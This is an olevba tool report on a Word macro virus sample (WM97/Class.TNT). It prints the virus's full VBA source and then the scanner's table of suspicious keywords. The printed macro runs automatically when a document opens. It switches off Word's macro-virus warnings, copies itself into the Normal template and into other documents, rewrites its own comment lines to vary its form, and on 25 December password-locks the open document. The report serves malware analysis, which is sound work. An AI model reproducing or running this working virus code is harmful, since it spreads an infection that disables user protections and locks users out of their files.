olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.TNT-b334ca6f454bbdeb443b4021192c02baa524fb57
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.TNT-b334ca6f454bbdeb443b4021192c02baa524fb57 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'69@#"%G6@-!4-B$G6@-!4
Dim rsx, rox, xix, xxi As Integer: Dim xxe, xex, exx, exd, cxi, cix, xic, eox, xoe, oxe, cii, rxe, rex, exr, nix, ixn, nxi, lnr, nrl, rnl As String: o = 0: r = 0
'69@#"%G6@-!4-B$G6@-!4
Randomize
'69@#"%G6@-!4-B$G6@-!4
On Error GoTo 93
'69@#"%G6@-!4-B$G6@-!4
Options.VirusProtection = Chr(48)
'69@#"%G6@-!4-B$G6@-!4
Options.SaveNormalPrompt = Chr(48)
'69@#"%G6@-!4-B$G6@-!4
Options.ConfirmConversions = Chr(48)
'69@#"%G6@-!4-B$G6@-!4
rt = ActiveDocument.VBProject.VBComponents.Item(Abs(1)).codemodule.countoflines
'69@#"%G6@-!4-B$G6@-!4
dt = NormalTemplate.VBProject.VBComponents.Item(Abs(1)).codemodule.countoflines
'69@#"%G6@-!4-B$G6@-!4
If dt > 0 And rt > 0 Then GoTo 93
'69@#"%G6@-!4-B$G6@-!4
If dt = 0 Then
'69@#"%G6@-!4-B$G6@-!4
    Set tnt = NormalTemplate.VBProject.VBComponents
'69@#"%G6@-!4-B$G6@-!4
    Set hst = ActiveDocument.VBProject.VBComponents
'69@#"%G6@-!4-B$G6@-!4
    If Month(Now()) = 12 And Day(Now()) = 23 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83) + Chr(32) + Chr(83) + Chr(65) + Chr(89) + Chr(83) + Chr(32) + Chr(72) + Chr(73)
'69@#"%G6@-!4-B$G6@-!4
    If Month(Now()) = 12 And Day(Now()) = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(84) + Chr(78) + Chr(84)
'69@#"%G6@-!4-B$G6@-!4
    If Month(Now()) = 12 And Day(Now()) = 25 Then Application.ActiveDocument.Password = "TNT"
'69@#"%G6@-!4-B$G6@-!4
    hst.Item(Abs(1)).Name = tnt.Item(Abs(1)).Name
'69@#"%G6@-!4-B$G6@-!4
    hst.Item(Abs(1)).Export Application.StartupPath & System.Version
'69@#"%G6@-!4-B$G6@-!4
End If
'69@#"%G6@-!4-B$G6@-!4
If rt = 0 Then Set tnt = ActiveDocument.VBProject.VBComponents
'69@#"%G6@-!4-B$G6@-!4
tnt.Item(Abs(1)).codemodule.AddFromFile Application.StartupPath & System.Version
'69@#"%G6@-!4-B$G6@-!4
With tnt.Item(Abs(1)).codemodule
'69@#"%G6@-!4-B$G6@-!4
    For j = Chr(49) To Chr(52)
'69@#"%G6@-!4-B$G6@-!4
    .deletelines Chr(49)
'69@#"%G6@-!4-B$G6@-!4
    Next j
'69@#"%G6@-!4-B$G6@-!4
    End With
'69@#"%G6@-!4-B$G6@-!4
If dt = 0 Then tnt.Item(Abs(1)).codemodule.replaceline 1, "Sub AutoClose()"
'69@#"%G6@-!4-B$G6@-!4
If dt = 0 Then tnt.Item(Abs(1)).codemodule.replaceline 99, "Sub ToolsMarco()"
'69@#"%G6@-!4-B$G6@-!4
If dt = 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'69@#"%G6@-!4-B$G6@-!4
With tnt.Item(Abs(1)).codemodule
'69@#"%G6@-!4-B$G6@-!4
    rsx = Int(Rnd(11) * 2998) + 24: rox = Int(Rnd(15) * 5863) + 33: xix = Int(Rnd(44) * 3544) + 55
'69@#"%G6@-!4-B$G6@-!4
    cii = Asc(rsx): eox = Chr$(cii + 5): xoe = Chr$(cii - 14): oxe = Chr$(cii + 22): lnr = Chr$(cii - 4)
'69@#"%G6@-!4-B$G6@-!4
    cix = Asc(rox): rxe = Chr$(cix + 7): rex = Chr$(cix - 16): exr = Chr$(cix + 4): nrl = Chr$(cix - 17)
'69@#"%G6@-!4-B$G6@-!4
    xic = Asc(xix): nix = Chr$(xic + 9): ixn = Chr$(xic - 18): nxi = Chr$(xic + 8): rnl = Chr$(xic - 33)
'69@#"%G6@-!4-B$G6@-!4
    cxi = Asc(xxi): xxe = Chr$(cxi + 4): xex = Chr$(cxi - 3): exx = Chr$(cxi + 18): exd = Chr$(cxi - 12)
'69@#"%G6@-!4-B$G6@-!4
    If Month(Now()) = 12 And Day(Now()) = 26 Then .replaceline 87, ".replaceline j, Chr(39) & eox & rxe & nix & xoe & rex & ixn & o * o & r * r * o * o & r * r * o & exx & exd & oxe & exr & nix & lnr & nrl & rnl & xxe"
'69@#"%G6@-!4-B$G6@-!4
    rd1 = Int(Rnd(1) * 40) + 1
'69@#"%G6@-!4-B$G6@-!4
    If rd1 = 39 Then .replaceline 87, ".replaceline j, Chr(39) & eox & rxe & nix & xoe & rex & ixn & oxe & exr & nix & lnr & nrl & rnl & xxe & xex & exx & exd & oxe & exr & nix & lnr & nrl & rnl & xxe"
'69@#"%G6@-!4-B$G6@-!4
End With
'69@#"%G6@-!4-B$G6@-!4
  With tnt.Item(Abs(1)).codemodule
'69@#"%G6@-!4-B$G6@-!4
For j = Chr(50) To tnt.Item(Abs(1)).codemodule.countoflines Step Chr(50)
'69@#"%G6@-!4-B$G6@-!4
    r = Int(Rnd(412835) * 303989) + 8485
'69@#"%G6@-!4-B$G6@-!4
    o = Int(Rnd(487958) * 785865) + 2988
'69@#"%G6@-!4-B$G6@-!4
.replaceline j, Chr(39) & eox & rxe & nix & xoe & rex & ixn & oxe & exr & nix & lnr & nrl & rnl & xxe & xex & exx & exd & oxe & exr & nix & lnr & nrl & rnl & xxe
'69@#"%G6@-!4-B$G6@-!4
    Next j
'69@#"%G6@-!4-B$G6@-!4
 End With
'69@#"%G6@-!4-B$G6@-!4
93:
'69@#"%G6@-!4-B$G6@-!4
If dt <> 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'69@#"%G6@-!4-B$G6@-!4
End Sub
'69@#"%G6@-!4-B$G6@-!4
Sub ViewVBCode()
'69@#"%G6@-!4-B$G6@-!4
End Sub 'WM97/Class.TNT by Virus :) Smile
'69@#"%G6@-!4-B$G6@-!4
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

